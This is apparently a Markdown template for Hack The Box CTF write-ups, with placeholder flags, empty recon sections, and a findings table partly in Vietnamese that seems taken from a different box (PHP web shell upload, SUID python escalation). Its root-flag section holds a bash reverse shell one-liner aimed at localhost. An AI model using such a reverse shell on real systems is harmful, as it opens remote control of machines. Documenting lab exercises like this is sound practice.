---
title: "Hack The Box - BOX NAME HERE"
author: Ryan Kozak
date: "2021-06-15"
subject: "CTF Writeup Template"
keywords: [HTB, CTF, Hack The Box, Security, Offensive]
lang: "en"

---


# Recon

## Nmap

# Exploitation  



## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

``` 
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.



**Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka

# Security Issues Identified

| Vulnerability                        | Severity   | Impact |
|--------------------------------------|------------|--------|
| Unrestricted File Upload (Extension Bypass) | **Critical** | Cho phép attacker upload Web Shell (.php5) dẫn đến **Remote Code Execution (RCE)** và chiếm quyền điều khiển server |
| Insecure File Upload Handling        | High       | Không kiểm tra loại file và extension chặt chẽ, cho phép thực thi mã PHP nguy hiểm |
| Abusing SUID Binary (`python2.7`)    | High       | Cho phép user thấp (`www-data`) leo thang đặc quyền lên **root** |
| Information Disclosure               | Medium     | Có thể leak thông tin (ví dụ: đường dẫn, phiên bản phần mềm) qua các trang web |


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.

# References
1. [https://ryankozak.com/how-i-do-my-ctf-writeups/](https://ryankozak.com/how-i-do-my-ctf-writeups/)
2. [https://github.com/Wandmalfarbe/pandoc-latex-template](https://github.com/Wandmalfarbe/pandoc-latex-template)
3. [https://hackthebox.eu](https://hackthebox.eu)
4. [https://forum.hackthebox.eu](https://forum.hackthebox.eu)